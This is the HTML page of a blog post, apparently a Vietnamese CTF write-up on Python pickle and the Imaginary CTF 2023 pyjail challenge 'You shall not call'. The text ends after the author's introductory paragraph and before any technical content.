<!DOCTYPE html>
<html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
  data-auto-appearance="true"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
  <meta charset="utf-8" />
  
  <meta http-equiv="content-language" content="en" />
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta http-equiv="X-UA-Compatible" content="ie=edge" />
  
  <title>The journy deep down to the pickle machine &middot; hibwyli</title>
  <meta name="title" content="The journy deep down to the pickle machine &middot; hibwyli" />
  
  <meta name="description" content="The journy deep down to the pickle machine" />
  <meta name="keywords" content="Misc, " />
  
  
  <link rel="canonical" href="//localhost:1313/posts/ictf-2023/" />
  
  
  
  
  
  
  
  
  
  
  <link type="text/css" rel="stylesheet" href="/css/main.bundle.min.857ec6700dbdcae3e112eba9fc29e3aa948366934f76d502f60b6a3e436e12e2f10925d27f3032ad87f18cbcaddb981eca1fa59d74de83da90ade26f5faf75dd.css"
    integrity="sha512-hX7GcA29yuPhEuup/CnjqpSDZpNPdtUC9gtqPkNuEuLxCSXSfzAyrYfxjLyt25geyh&#43;lnXTeg9qQreJvX6913Q==" />
  
  
  <script type="text/javascript" src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
  
  
  
  
  
  
  
  <script defer type="text/javascript" id="script-bundle" src="/js/main.bundle.min.984038b35a762692ece6c2038acfa3c9b3eb54655e7bd4838c6ccd3ec0fa375df9477c7a5e2cb6212e4e6847a8b6b8aca64624df0467a3d4d876528de8846064.js"
    integrity="sha512-mEA4s1p2JpLs5sIDis&#43;jybPrVGVee9SDjGzNPsD6N135R3x6Xiy2IS5OaEeotrispkYk3wRno9TYdlKN6IRgZA==" data-copy="" data-copied=""></script>
  
  
  
  <script src="/lib/zoom/zoom.min.37d2094687372da3f7343a221a470f6b8806f7891aa46a5a03966af7f0ebd38b9fe536cb154e6ad28f006d184b294525a7c4054b6bbb4be62d8b453b42db99bd.js" integrity="sha512-N9IJRoc3LaP3NDoiGkcPa4gG94kapGpaA5Zq9/Dr04uf5TbLFU5q0o8AbRhLKUUlp8QFS2u7S&#43;Yti0U7QtuZvQ=="></script>
  
  
  
  <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png" />
  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png" />
  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png" />
  <link rel="manifest" href="/site.webmanifest" />
  
  
  
  
  
  
  
  
  <meta property="og:url" content="//localhost:1313/posts/ictf-2023/">
  <meta property="og:site_name" content="hibwyli">
  <meta property="og:title" content="The journy deep down to the pickle machine">
  <meta property="og:description" content="The journy deep down to the pickle machine">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2023-04-27T00:00:00+00:00">
    <meta property="article:modified_time" content="2023-04-27T00:00:00+00:00">
    <meta property="article:tag" content="Misc">
    <meta property="og:image" content="//localhost:1313/posts/ictf-2023/feature-i.png">

  
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="//localhost:1313/posts/ictf-2023/feature-i.png">
  <meta name="twitter:title" content="The journy deep down to the pickle machine">
  <meta name="twitter:description" content="The journy deep down to the pickle machine">

  
  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "The journy deep down to the pickle machine",
    "headline": "The journy deep down to the pickle machine",
    "description": "The journy deep down to the pickle machine",
    "abstract": "The journy deep down to the pickle machine",
    "inLanguage": "en",
    "url" : "\/\/localhost:1313\/posts\/ictf-2023\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2023",
    "dateCreated": "2023-04-27T00:00:00\u002b00:00",
    "datePublished": "2023-04-27T00:00:00\u002b00:00",
    
    "dateModified": "2023-04-27T00:00:00\u002b00:00",
    
    "keywords": ["Misc"],
    
    "mainEntityOfPage": "true",
    "wordCount": "2174"
  }]
  </script>


  
  
  
  
  

<script src="/lib/jquery/jquery.slim.min.7d88d2a1c0c3e9cb6e435406228f7e367f4e73899f6aed88884f0a8b5172315e0e704494b7cd4532a9a1b197bdcd667a83a35d733ac4300a2cd4694b2c08a95a.js" integrity="sha512-fYjSocDD6ctuQ1QGIo9&#43;Nn9Oc4mfau2IiE8Ki1FyMV4OcESUt81FMqmhsZe9zWZ6g6NdczrEMAos1GlLLAipWg=="></script>






















  
  



  
  
  <meta name="theme-color"/>
  
  
</head>
<body
  class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
  <div id="the-top" class="absolute flex self-center">
    <a class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
      href="#main-content"><span
        class="font-bold text-primary-600 ltr:pr-2 rtl:pl-2 dark:text-primary-400">&darr;</span>Skip to main content</a>
  </div>
  
  
  <div style="padding-left:0;padding-right:0;padding-top:2px;padding-bottom:3px"
    class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start space-x-3">
    
    <div class="flex flex-1 items-center justify-between">
        <nav class="flex space-x-3">

            
            <a href="/" class="text-base font-medium text-gray-500 hover:text-gray-900">hibwyli</a>
            

        </nav>
        <nav class="hidden md:flex items-center space-x-5 md:ml-12 h-12">

            
            
            
  <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Posts">
        Posts
    </p>
</a>



            
            
  <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="About">
        About
    </p>
</a>



            
            
  <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Categories">
        Categories
    </p>
</a>



            
            
  <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-base font-medium" title="Tags">
        Tags
    </p>
</a>



            
            

            


            
            <button id="search-button" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            


            
            
            <div
                class="ltr:mr-14 rtl:ml-14 flex items-center">
                <button id="appearance-switcher" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400">
                    <div class="flex items-center justify-center dark:hidden">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                    </div>
                    <div class="items-center justify-center hidden dark:flex">
                        

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                    </div>
                </button>
            </div>
            

        </nav>
        <div class="flex md:hidden items-center space-x-5 md:ml-12 h-12">

            <span></span>

            


            
            <button id="search-button-mobile" aria-label="Search" class="text-base hover:text-primary-600 dark:hover:text-primary-400"
                title="">
                

  <span class="relative block icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


            </button>
            

            
            
            <button id="appearance-switcher-mobile" aria-label="Dark mode switcher" type="button" class="text-base hover:text-primary-600 dark:hover:text-primary-400" style="margin-right:5px">
                <div class="flex items-center justify-center dark:hidden">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>


                </div>
                <div class="items-center justify-center hidden dark:flex">
                    

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>


                </div>
            </button>
            

        </div>
    </div>
    <div class="-my-2 -mr-2 md:hidden">

        <label id="menu-button" class="block">
            
            <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>

  </span>


            </div>
            <div id="menu-wrapper" style="padding-top:5px;"
                class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50">
                <ul
                    class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">

                    <li id="menu-close-button">
                        <span
                            class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>

</span>
                    </li>

                    

                    
  <li class="mt-1">
    <a href="/posts/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Posts">
            Posts
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/about/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="About">
            About
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/categories/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Categories">
            Categories
        </p>
    </a>
</li>




                    

                    
  <li class="mt-1">
    <a href="/tags/"  class="flex items-center text-gray-500 hover:text-primary-600 dark:hover:text-primary-400">
        
        <p class="text-bg font-bg" title="Tags">
            Tags
        </p>
    </a>
</li>




                    

                </ul>
                
                <hr>
                <ul
                    class="flex mt-4 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none ltr:text-right rtl:text-left max-w-7xl">


                    
                    <li class="mb-1">
                        <a href="/tags/pwnable/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Pwnable">
                                Pwnable
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href="/tags/web/"  class="flex items-center">
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="Web">
                                Web
                            </p>
                        </a>
                    </li>
                    
                    <li class="mb-1">
                        <a href=""  class="flex items-center">
                            
                            <span  class="mr-3" >
                                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


                            </span>
                            
                            <p class="text-sm font-sm text-gray-500 hover:text-gray-900" title="">
                                Write up
                            </p>
                        </a>
                    </li>
                    

                </ul>
                
                

            </div>
        </label>
    </div>
</div>


<div class="main-menu flex pb-3 flex-col items-end justify-between md:justify-start space-x-3" >
    <div class="hidden md:flex items-center space-x-5">
        
        <a href="/tags/pwnable/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Pwnable">
                Pwnable
            </p>
        </a>
        
        <a href="/tags/web/"  class="flex items-center">
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="Web">
                Web
            </p>
        </a>
        
        <a href=""  class="flex items-center">
            
            <span  class="mr-1" >
                

  <span class="relative block icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>


            </span>
            
            <p class="text-xs font-light text-gray-500 hover:text-gray-900" title="">
                Write up
            </p>
        </a>
        
    </div>
</div>




  
  <div class="relative flex flex-col grow">
    <main id="main-content" class="grow">
      


<article>
  
  
  
  
  
  


<div id="hero" class="h-[150px] md:h-[200px]"></div>



    
    <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom"
    style="background-image:url(/posts/ictf-2023/feature-i.png);">
    


    <div class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal">
    </div>
    <div
        class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal">
    </div>
</div>

<div id="background-blur" class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
<script>
    window.addEventListener('scroll', function (e) {
        var scroll = window.pageYOffset || document.documentElement.scrollTop || document.body.scrollTop || 0;
        var background_blur = document.getElementById('background-blur');
        background_blur.style.opacity = (scroll / 300)
    });
</script>

  
  

  <header id="single_header" class="mt-5 max-w-prose">
    
    <ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden">
  
  
    
  
    
  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/"
      >hibwyli</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline ">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/"
      >Posts</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

  
  <li class="inline hidden">
    <a
      class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
      href="/posts/ictf-2023/"
      >The journy deep down to the pickle machine</a
    ><span class="px-1 text-primary-500">/</span>
  </li>

</ol>


    
    <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
      The journy deep down to the pickle machine
    </h1>
    <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
      





  
  







  







  













<div class="flex flex-row flex-wrap items-center">
  
  
  <time datetime="2023-04-27T00:00:00&#43;00:00">27 April 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">11 mins</span>
  

  
  
</div>


<div class="flex flex-row flex-wrap items-center">
  
  
  
  
     <div style="cursor: pointer;" onclick="window.open(&#34;/authors/shin24/&#34;,'_self');return false;">Shin24</div>
  
  
  
  
  
  
  
  
  
  
</div>




<div class="flex flex-row flex-wrap items-center">
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/categories/writeup/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Writeup
  </span>
</span>
  </span>
  
  
  
  
  
  
  
  
  
  <span style="margin-top:0.5rem" class="mr-2" onclick="window.open(&#34;/tags/misc/&#34;,'_self');return false;">
    <span class="flex" style="cursor: pointer;">
  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
    Misc
  </span>
</span>
  </span>
  
  
  
  
</div>




    </div>

    
    
    
    
    

    

    
      
      
        
        
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>

      

      
        

      
      <div class="mb-5"></div>
      

    

  </header>
  
  <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
    
     <div
      class="order-first lg:ml-auto px-0 lg:order-last ltr:lg:pl-8 rtl:lg:pr-8">
      <div class="toc ltr:pl-5 rtl:pr-5 print:hidden lg:sticky lg:top-10">

         <details open id="TOCView"
  class="toc-right mt-0 overflow-y-scroll overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#python-pickle">Python Pickle</a>
      <ul>
        <li><a href="#introduction">Introduction</a></li>
        <li><a href="#pickle-structure">Pickle structure</a></li>
        <li><a href="#what-could-go-wrong">What could go wrong</a></li>
      </ul>
    </li>
    <li><a href="#the-challenge">The challenge</a>
      <ul>
        <li><a href="#analyzing">Analyzing</a></li>
        <li><a href="#lets-the-game-begin">Let&rsquo;s the game begin</a></li>
        <li><a href="#overwrite-the-world">Overwrite the world</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>
<details class="toc-inside mt-0 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 lg:hidden">
  <summary
    class="py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="py-2 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#python-pickle">Python Pickle</a>
      <ul>
        <li><a href="#introduction">Introduction</a></li>
        <li><a href="#pickle-structure">Pickle structure</a></li>
        <li><a href="#what-could-go-wrong">What could go wrong</a></li>
      </ul>
    </li>
    <li><a href="#the-challenge">The challenge</a>
      <ul>
        <li><a href="#analyzing">Analyzing</a></li>
        <li><a href="#lets-the-game-begin">Let&rsquo;s the game begin</a></li>
        <li><a href="#overwrite-the-world">Overwrite the world</a></li>
      </ul>
    </li>
  </ul>
</nav>
  </div>
</details>

<script>

  var margin = 200;
  var marginError = 50;

  (function () {
    var $window = $(window);
    var $toc = $('#TOCView');
    var tocHeight = $toc.height();

    function onResize() {
      var windowAndMarginHeight = $window.height() - margin;
      if(tocHeight >= windowAndMarginHeight) {
        $toc.css("overflow-y", "scroll")
        $toc.css("max-height", (windowAndMarginHeight + marginError) + "px")
      } else {
        $toc.css("overflow-y", "hidden")
        $toc.css("max-height", "9999999px")
      }
    }

    $window.on('resize', onResize);
    $(document).ready(onResize);
  })();



</script>
   </div>
      </div>
      

      <div class="min-w-0 min-h-0 max-w-fit">
        
        


        <div class="article-content max-w-prose mb-20">
          <p>Vừa rồi trong giải Imaginary CTF 2023, mình đã tham gia cùng team nhưng không đóng góp được nhiều, do các bài web đầu khá dễ nên hầu như ai cũng làm được, dẫn đến điểm giảm còn 100, bài <code>amongus</code> thì dù mình đã tìm ra hướng đúng nhưng xử lý sót nên payload đã không hoạt động, sau khi đọc writeup và nhận ra sai lầm thì mình đã khá cay :)))</p>
<p>Ngoài ra mình có attemp 1 (hoặc có thể là 2) challenge nữa là <code>You shall not call</code>, đây là một bài pyjail khá hay và khó, sau khi nghía qua script giải thì mình nhận ra được hướng của bài và bắt đầu ngồi tự giải lại. Sau đây mình sẽ nói về pickle và writeup lại quá trình giải bài này</p>


<h2 class="relative group">Python Pickle 
    <div id="python-pickle" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#python-pickle" aria-label="Anchor">#</a>
    </span>        
    
</h2>


<h3 class="relative group">Introduction 
    <div id="introduction" class="anchor"></div>
    
    <span
        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
            style="text-decoration-line: none !important;" href="#introduction" aria-label="Anchor">#</a>
    </span>        
    
</h3>
